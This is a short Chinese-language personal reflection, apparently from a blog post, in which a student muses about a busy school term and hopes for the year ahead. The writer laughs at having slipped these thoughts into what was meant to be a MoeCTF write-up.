10.9了，开学一个月了，我也感觉自己忙起来了。好多学校的事，也有好多自己想做的事

新的一年会怎么样呢

一定会进步很多的

也一定会过的很开心的

嘿嘿

不是我怎么又把感慨写在MoeCTF里了

我记得一开始我是打算这篇只作为题解的啊

大概是看见比赛结束的群公告又不自觉地感慨上了吧（
